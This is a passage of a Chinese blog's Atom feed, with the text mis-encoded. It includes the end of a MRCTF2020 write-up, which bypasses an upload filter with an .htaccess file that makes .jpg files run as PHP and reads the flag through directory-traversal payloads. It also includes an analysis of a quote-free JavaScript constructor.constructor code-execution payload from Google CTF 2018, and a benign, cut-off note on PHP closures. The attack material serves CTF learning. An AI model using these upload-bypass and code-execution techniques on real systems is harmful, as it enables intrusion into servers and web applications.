class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure><p>payloadæ‰“ä¸Šå»å³æ˜¾ç¤º flag</p><br><h1 id="MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢"><a href="#MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢"></a>[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</h1><p>å‚è€ƒ:</p><p><a href="https://book.hacktricks.xyz/pentesting-web/file-upload">https://book.hacktricks.xyz/pentesting-web/file-upload</a></p><br><p>è¿™é“é¢˜åªè¦ä¸Šä¼ æ–‡ä»¶åä¸º .php* .phtml* éƒ½ä¼šè¢«æ‹¦æˆªã€‚</p><p>å¦è¾Ÿè¹Šå¾„ï¼Œä¸Šä¼  .htaccess è¿›è¡Œç»•è¿‡ã€‚.htaccess å†…å®¹ä¸º <u>å½“å‰ç›®å½•ä¸‹æ‰€æœ‰ .jpg åç¼€æ–‡ä»¶éƒ½ä»¥ php è¿›è¡Œè§£æ</u></p><p><em>.htaccess</em></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;Files *.jpg&gt;</span><br><span class="line">ForceType application/x-httpd-php</span><br><span class="line">&lt;/Files&gt;</span><br></pre></td></tr></table></figure><br><p>ä¸Šä¼ æˆåŠŸåå†ä¼ ä¸ªæ™®é€šçš„ phpä¸€å¥è¯å³å¯ï¼ŒæŸ¥çœ‹ <code>phpinfo()</code>ã€‚</p><p>disable_functions:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld</span><br></pre></td></tr></table></figure><br><p>ç”±äºåªæ˜¯ get flagã€‚é‚£å°±ä¸ getshelläº†ã€‚ bypass disable_function è¿‡å‡ å¤©æœ¬åœ°æ­å»ºç ”ç©¶ä¸‹ï¼ˆæŒ–ä¸€å‘ï¼‰ã€‚ç›´æ¥ä½¿ç”¨ php å†…ç½®çš„æ‰«ç›®å½•å’Œè¯»æ–‡ä»¶å‘½ä»¤ <code>scandir</code> å’Œ <code>file_get_contents</code> æ¥è¿›è¡Œè¯» flag æ“ä½œ</p><br><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[æ‰«ç›®å½•]</span><br><span class="line">var_dump(scandir(<span class="string">&quot;../../../../../../&quot;</span>));</span><br><span class="line"></span><br><span class="line">[OUTPUT:]</span><br><span class="line">...</span><br><span class="line">flag</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">=============</span><br><span class="line">[è¯»flag]</span><br><span class="line">var_dump(file_get_contents(<span class="string">&quot;../../../../../../flag&quot;</span>));</span><br><span class="line"></span><br><span class="line">[OUTPUT:]</span><br><span class="line">...</span><br><span class="line">flag&#123;xxxxxxx&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;å‘¨æœ«ç©äº†ç©CTFï¼Œåšä¸ªå°è®°å½•&lt;/p&gt;
&lt;p&gt;å¹³å°åœ°å€ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://buuoj.cn/&quot;&gt;https://buuoj.cn/&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="WEB" scheme="http://example.com/categories/CTF/WEB/"/>
    
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Javascript constructor ç›¸å…³å°çŸ¥è¯†åˆ†äº«</title>
    <link href="http://example.com/2021/03/11/2021-03-11-javascript-constructor/"/>
    <id>http://example.com/2021/03/11/2021-03-11-javascript-constructor/</id>
    <published>2021-03-11T07:57:35.000Z</published>
    <updated>2021-03-11T13:55:52.879Z</updated>
    
    <content type="html"><![CDATA[<p>çœ‹äº† Orangeå¤§ä½¬çš„ â€œ<a href="http://blog.orange.tw/2018/06/google-ctf-2018-quals-web-gcalc.html">Google CTF 2018 Quals Web Challenge - gCalc</a>â€ ä¸€æ–‡ã€‚å‘ç°äº†è®¸å¤šæœ‰è¶£çš„å°æŠ€å·§å°çŸ¥è¯†ã€‚è¿™é‡Œç®€å•å†™ä¸€å†™å…³äºè¿™äº›å°çŸ¥è¯†çš„ç†è§£ã€‚</p><span id="more"></span><br><h1 id="åˆ†ææ­£åˆ™è¡¨è¾¾å¼"><a href="#åˆ†ææ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="åˆ†ææ­£åˆ™è¡¨è¾¾å¼"></a>åˆ†ææ­£åˆ™è¡¨è¾¾å¼</h1><p>åŸæ–‡ä¸­æåˆ°äº†ä¸€ä¸ªåœ¨çº¿æ­£åˆ™è¡¨è¾¾å¼å¹³å°ï¼Œä½¿ç”¨äº†ä¸‹ç¡®å®å¥½ç”¨ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;^(?:[\(\)\*\&#x2F;\+%\-0-9 ]|\bvars\b|[.]\w+)*$&#x2F;</span><br></pre></td></tr></table></figure><p><strong>è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼ä¸»è¦å†…å®¹å¯ä»¥åˆ†ä¸º ä¸‰éƒ¨åˆ†ï¼Œæ³¨æ„å„ä¸ªéƒ¨åˆ†æ˜¯ä½¿ç”¨ | è¿›è¡Œåˆ†å‰²:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?:[\(\)\*\&#x2F;\+%\-0-9 ]</span><br></pre></td></tr></table></figure><p>æ‰©å±•è§£é‡Šä¸‹æ­£åˆ™è¡¨è¾¾å¼</p><p>A|B     ä¸ºæˆ–ï¼ŒåŒ¹é…æ•è· A æˆ–è€… B</p><p>A(?=B) åŒ¹é…æ—¶ AB éœ€è¦è¿ç€ã€‚æ•è·æ—¶åªè¿”å›A</p><p>A(?!B)  åŒ¹é…æ—¶ AB ä¸èƒ½è¿ç€ã€‚æ•è·æ—¶åªè¿”å›A</p><p>A(?:B)  åŒ¹é…æ—¶ AB éœ€è¦è¿ç€ã€‚ä½†æ˜¯ä¸æ•è·ã€‚ä»…åŒ¹é…ã€‚ä¸€èˆ¬é…åˆ | ä½¿ç”¨ã€‚å¯ä»¥ç†è§£ä¸º å¯æœ‰å¯æ— </p><img src="/2021/03/11/2021-03-11-javascript-constructor/1.png" style="width:200px;"><br><img src="/2021/03/11/2021-03-11-javascript-constructor/2.png" style="width:200px;"><p>è¿™ä¸€æ®µæ­£åˆ™è¡¨è¾¾å¼çš„æ„æ€ä¸ºï¼Œä»…åŒ¹é… <code>( ) * / + % - 0-9 ç©ºæ ¼</code> è¿™äº›å­—ç¬¦</p><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\bvars\b</span><br></pre></td></tr></table></figure><p>\b åŒ¹é…ä¸€ä¸ªå•è¯è¾¹ç•Œï¼Œä¸è¿‡å¥½åƒä¸å¤ªé‡è¦</p><p>è¿™ä¸€æ®µæ­£åˆ™è¡¨è¾¾å¼çš„æ„æ€ä¸ºï¼Œå¾…åŒ¹é…å­—ç¬¦ä¸²å¿…é¡»å­˜åœ¨ <code>vars</code> è¿™ä¸€ä¸ªå­—ç¬¦ä¸²</p><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[.]\w+</span><br></pre></td></tr></table></figure><p>è¿™ä¸€æ®µæ­£åˆ™è¡¨è¾¾å¼çš„æ„æ€ä¸ºï¼ŒåŒ¹é… <code>.</code> å’Œå„ä¸ªå•è¯å­—ç¬¦</p><p>regex101 æœ‰ Debugger æ¨¡å¼ï¼Œå¯ä»¥è¾“å…¥ä»¥ä¸‹å­—ç¬¦ä¸²è¿›è¡ŒåŒ¹é…ï¼Œæ›´æ˜“ç†è§£</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(vars).toString()</span><br></pre></td></tr></table></figure><br><h1 id="constructor-NaN"><a href="#constructor-NaN" class="headerlink" title="constructor"></a>constructor</h1><p><em>Object</em> éƒ½å¸¦æœ‰ä¸€ä¸ª <em>constructor</em>ï¼Œ<em>ç”¨äºè¿”å›åˆ›å»ºå®ä¾‹å¯¹è±¡çš„æ„é€ å‡½æ•°çš„å¼•ç”¨</em>ã€‚</p><p>ä¸åŒç±»å‹ä¼šä¸ä¸€æ ·ã€‚å³ä»€ä¹ˆç±»å‹çš„ <em>constructor</em> å°†ä¼šè¿”å›ä»€ä¹ˆç±»å‹çš„å®ä¾‹</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">x1 = <span class="number">1</span></span><br><span class="line">x1.constructor</span><br><span class="line">[OUTPUT:] Æ’ <span class="function"><span class="title">Number</span>(<span class="params"></span>)</span> &#123; [native code] &#125;</span><br><span class="line"></span><br><span class="line">x1.toString().constructor</span><br><span class="line">[OUTPUT:] Æ’ <span class="function"><span class="title">String</span>(<span class="params"></span>)</span> &#123; [native code] &#125;</span><br></pre></td></tr></table></figure><p>åŸºæœ¬ä½¿ç”¨çœ‹<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/constructor">å®˜æ–¹æ–‡æ¡£</a>å°±å¥½äº†ã€‚</p><br><p><strong>é‡ç‚¹è¯´ä¸‹æœ‰æ„æ€çš„åœ°æ–¹ã€‚</strong></p><p>å¦‚æœè°ƒç”¨ <strong>ä¸€å±‚</strong> <em>constructor</em>ã€‚åˆ™è¿™ä¸ªæ„é€ å‡½æ•°æ˜¯ å¯¹åº”ç±»å‹ çš„æ„é€ å‡½æ•°ã€‚åªèƒ½è¾“å…¥æŒ‡å®šç±»å‹</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">x1 = <span class="number">1</span></span><br><span class="line">x1.constructor(<span class="number">33</span>)</span><br><span class="line">[OUTPUT:] <span class="number">33</span></span><br><span class="line"></span><br><span class="line">x1.constructor(<span class="string">&quot;aa&quot;</span>)</span><br><span class="line">[OUTPUT:] <span class="literal">NaN</span></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å¦‚æœè°ƒç”¨ <strong>å¤šå±‚</strong> <em>constructor</em>. åˆ™å¤šå±‚æ„é€ å‡½æ•°è¿”å›ä¸€ä¸ªåŒ¿åå‡½æ•°ã€‚å‡½æ•°ä½“å†…å®¹ä¸ºè¾“å…¥çš„å‚æ•°ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">x.constructor.constructor(<span class="string">&quot;alert(1)&quot;</span>)</span><br><span class="line">[OUTPUT:] </span><br><span class="line">Æ’ anonymous(</span><br><span class="line">) &#123;</span><br><span class="line">alert(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¦æƒ³å®ç°è°ƒç”¨ï¼Œåœ¨æœ«å°¾æ·»åŠ ä¸€å¯¹ <code>()</code> å³å¯ã€‚è¿™æ˜¯ js è°ƒç”¨å‡½æ•°çš„æ ¼å¼</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x.constructor.constructor(<span class="string">&quot;alert(1)&quot;</span>)()</span><br></pre></td></tr></table></figure><p>åœ¨ writeup ä¸­ï¼Œç”±äºæ— æ³•ä¼ å…¥å•åŒå¼•å·ã€‚æ‰€ä»¥ç¬¬ä¸€ä¸ª <em>Payload</em> åªèƒ½ä½¿ç”¨ <code>fromCharCode()</code> çš„æ–¹å¼è·å–å­—ç¬¦ä¸²</p><br><h1 id="Javascript-æ— å¼•å·åˆ©ç”¨"><a href="#Javascript-æ— å¼•å·åˆ©ç”¨" class="headerlink" title="Javascript æ— å¼•å·åˆ©ç”¨"></a>Javascript æ— å¼•å·åˆ©ç”¨</h1><p>æ–‡ç« ä¸­æœ€ç»ˆçš„ payload ä¸º</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>).constructor.constructor(<span class="regexp">/1/</span>.exec(<span class="number">1</span>).keys(<span class="number">1</span>).constructor.keys(vars).pop())</span><br></pre></td></tr></table></figure><p>é¦–å…ˆéœ€è¦ç†è§£ï¼Œæœ€ç»ˆçš„ payload æ˜¯éœ€è¦è·å– <code>vars</code> çš„ç´¢å¼•å€¼æ¥ alertã€‚</p><p>Javascript Object ä¸­æœ‰ä¸ªåä¸º <em>keys</em> çš„æ–¹æ³•ã€‚<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/keys">å®˜ç½‘</a>ä¸­æœ‰ä¾‹å­ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;<span class="string">&quot;alert(1)&quot;</span>:<span class="number">0</span>&#125;</span><br><span class="line">(<span class="built_in">Object</span>).keys(payload)</span><br><span class="line">[OUTPUT:] [<span class="string">&quot;alert(1)&quot;</span>]</span><br></pre></td></tr></table></figure><p>å†ç»“åˆ Array çš„ pop æ–¹æ³•ã€‚æˆ‘ä»¬å°±å¯ä»¥è·å–ç´¢å¼•å€¼äº†</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;<span class="string">&quot;alert(1)&quot;</span>:<span class="number">0</span>&#125;</span><br><span class="line">(<span class="built_in">Object</span>).keys(payload).pop()</span><br><span class="line">[OUTPUT:] <span class="string">&quot;alert(1)&quot;</span></span><br></pre></td></tr></table></figure><br><p>åŸ payload æ˜¯å…ˆä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æ¥è·å– Objectï¼Œç„¶åæ‰èƒ½è·å–ç´¢å¼•å€¼ã€‚æˆ‘ä»¬æ¥åˆ†æä¸‹</p><p>è¿™ä¸€æ®µä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼è·å–ä¸€ä¸ª Object </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/<span class="number">1</span>/.exec(<span class="number">1</span>)</span><br><span class="line">[OUTPUT:]</span><br><span class="line"><span class="number">0</span>: <span class="string">&quot;1&quot;</span></span><br><span class="line">groups: <span class="literal">undefined</span></span><br><span class="line">index: <span class="number">0</span></span><br><span class="line">input: <span class="string">&quot;1&quot;</span></span><br><span class="line">length: <span class="number">1</span></span><br></pre></td></tr></table></figure><p>é€šè¿‡ Object keys æ–¹æ³•è·å–åˆ°æ•°ç»„è¿­ä»£å™¨ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/<span class="number">1</span>/.exec(<span class="number">1</span>).keys(<span class="number">1</span>)</span><br><span class="line">[OUTPUT:] <span class="built_in">Array</span> IteratorÂ &#123;&#125;</span><br></pre></td></tr></table></figure><p>æœ‰äº†æ•°ç»„è¿­ä»£å™¨ï¼Œå°±å¯ä»¥å¿«ä¹çš„ä½¿ç”¨ keys å’Œ pop è·å–ç´¢å¼•å€¼äº†</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/<span class="number">1</span>/.exec(<span class="number">1</span>).keys(<span class="number">1</span>).constructor.keys(payload).pop()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;çœ‹äº† Orangeå¤§ä½¬çš„ â€œ&lt;a href=&quot;http://blog.orange.tw/2018/06/google-ctf-2018-quals-web-gcalc.html&quot;&gt;Google CTF 2018 Quals Web Challenge - gCalc&lt;/a&gt;â€ ä¸€æ–‡ã€‚å‘ç°äº†è®¸å¤šæœ‰è¶£çš„å°æŠ€å·§å°çŸ¥è¯†ã€‚è¿™é‡Œç®€å•å†™ä¸€å†™å…³äºè¿™äº›å°çŸ¥è¯†çš„ç†è§£ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="Javascript" scheme="http://example.com/categories/Javascript/"/>
    
    
    <category term="Javascript" scheme="http://example.com/tags/Javascript/"/>
    
    <category term="æ­£åˆ™è¡¨è¾¾å¼" scheme="http://example.com/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>PHPé—­åŒ…åœ¨ç±»ä¸­çš„å°ç¬”è®°</title>
    <link href="http://example.com/2021/03/03/2021-03-03-Closure-inClass/"/>
    <id>http://example.com/2021/03/03/2021-03-03-Closure-inClass/</id>
    <published>2021-03-03T07:39:18.000Z</published>
    <updated>2021-03-15T15:35:37.783Z</updated>
    
    <content type="html"><![CDATA[<br><p>åœ¨ç¿»çœ‹ Laravel æºç æ—¶ï¼Œå‘ç°å…¶è¿›è¡ŒæœåŠ¡æ³¨å†Œçš„æ—¶å€™ï¼Œå¤§é‡ä½¿ç”¨äº†è¯¸å¦‚è¿™æ ·çš„æ ¼å¼:</p><span id="more"></span><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//æœåŠ¡ç±»çˆ¶ç±»</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Service</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$app</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="comment">//æ‰€æœ‰æœåŠ¡ç±»çš„æ„é€ æ–¹æ³•</span></span><br><span class="line"><span class="comment">//$app ç”¨äºå­˜æ”¾ å®¹å™¨ç±» çš„å®ä¾‹</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$app</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;app = <span class="variable">$app</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æœåŠ¡ç±»A</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ServiceA</span> <span class="keyword">extends</span> <span class="title">Service</span></span>&#123;</span><br><span class="line">    <span class="comment">//æ³¨å†Œæ–¹æ³•</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;app-&gt;singleton(<span class="built_in">self</span>::class, <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$app</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Some action in this Closure ......&#x27;</span>;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æœåŠ¡ç±»B</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ServiceB</span> <span class="keyword">extends</span> <span class="title">Service</span></span>&#123;</span><br><span class="line">    <span class="comment">//æ³¨å†Œæ–¹æ³•</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"><span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;app-&gt;singleton(<span class="built_in">self</span>::class, <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$app</span></span>) <span class="title">use</span>(<span class="params"><span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Some action in this Closure ......&#x27;</span>;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®¹å™¨ç±»</span></span><br><span class="line"><span class="comment">//$bindings å­˜æ”¾å„ä¸ªæœåŠ¡ç±»çš„å®ä¾‹</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Container</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$bindings</span> = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">singleton</span>(<span class="params"><span class="variable">$abstract</span>, <span class="variable">$concrete</span></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//æ³¨å†Œå„ä¸ªæœåŠ¡ç±»</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;bindings[<span class="variable">$abstract</span>] = <span class="variable">$concrete</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å…¥å£</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//å®¹å™¨ç±»</span></span><br><span class="line"><span class="variable">$Container</span> = <span class="keyword">new</span> Container();</span><br><span class="line"><span class="variable">$ServiceA</span> = <span class="keyword">new</span> ServiceA(<span class="variable">$Container</span>);</span><br><span class="line"><span class="variable">$ServiceB</span> = <span class="keyword">new</span> ServiceB(<span class="variable">$Container</span>);</span><br><span class="line">        <span class="comment">//æ³¨å†ŒæœåŠ¡</span></span><br><span class="line"><span class="variable">$ServiceA</span>-&gt;register();</span><br><span class="line">        <span class="variable">$ServiceB</span>-&gt;register([</span><br><span class="line">        <span class="string">&#x27;arg1&#x27;</span> =&gt; <span class="string">&#x27;value1&#x27;</span></span><br><span class="line">    ]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$Index</span> = <span class="keyword">new</span> Index();</span><br></pre></td></tr></table></figure><br><p>ä»¥ä¸Šä»£ç ä¸­ï¼Œ<em>Index</em>ç±»ä¸ºå…¥å£ï¼Œå°†æœåŠ¡ç±» <em>ServiceA</em> å’Œ <em>ServiceB</em> çš„å®ä¾‹å­˜æ”¾äº å®¹å™¨ç±» <em>Container</em> ä¸­</p><p>è¿™é‡Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼ŒæœåŠ¡ç±»åœ¨è°ƒç”¨å®¹å™¨ç±» <em>Container</em> çš„æ³¨å†Œæ–¹æ³• <em>singleton</em> æ—¶ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ³¨å†Œçš„åå­—ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ªåŒ¿åå‡½æ•°ã€‚</p><p>è¿™æ ·å­æ“ä½œï¼Œåœ¨å®¹å™¨ç±» <em>Container</em> çš„ æ³¨å†Œæ–¹æ³• <em>singleton</em> ä¸­ï¼Œ<code>$concrete</code> çš„å€¼åˆ°åº•æ˜¯ä»€ä¹ˆå‘¢ï¼ŸåŒ¿åå‡½æ•°çš„ <em>Closure</em> å®ä¾‹å—ï¼Ÿ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="comment">//æœåŠ¡ç±»A</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ServiceA</span> <span class="keyword">extends</span> <span class="title">Service</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;app-&gt;singleton(<span class="built_in">self</span>::class, <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$app</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Some action in this Closure ......&#x27;</span>;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®¹å™¨ç±»</span></span><br><span class="line"><span class="comment">//$bindings å­˜æ”¾å„ä¸ªæœåŠ¡ç±»çš„å®ä¾‹</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Container</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$bindings</span> = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">singleton</span>(<span class="params"><span class="variable">$abstract</span>, <span class="variable">$concrete</span></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//æ³¨å†Œå„ä¸ªæœåŠ¡ç±»</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;bindings[<span class="variable">$abstract</span>] = <span class="variable">$concrete</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">......</span><br></pre></td></tr></table></figure><br><p>é€šè¿‡ <em>Debuger</em> å¯ä»¥çœ‹åˆ°ï¼Œ<code>$concrete</code> ä¼ å…¥çš„ç¡®å®æ˜¯ä¸€ä¸ª <code>Closure</code>ç±»ï¼Œåªä¸è¿‡è¿™ä¸ªç±»é‡Œå¤´åŒ…å«ä¸¤ä¸ªæˆå‘˜:<code>$this</code> å’Œ <code>parameter</code>ã€‚å…¶ä¸­ <code>$this</code> çš„å€¼ä¸º <strong>è°ƒç”¨ç±»</strong> çš„ <em>$this</em>ã€‚è€Œ <code>parameter</code> é‡Œå¤´çš„å€¼ä¸º <em>é—­åŒ…</em> çš„ å½¢å‚ã€‚å¦‚æœä½¿ç”¨äº† <em>use</em> è¯­å¥ï¼Œè¿˜ä¼šå¤šä¸€ä¸ª <em>static</em> å­—æ®µï¼Œç”¨äºå­˜æ”¾ <em>use</em> çš„å˜é‡</p><img src="/2021/03/03/2021-03-03-Closure-inClass/1.png" style="width:500px"><p>é‚£ä¼ å…¥<em>é—­åŒ…</em> ç»™ <code>$bindings</code> 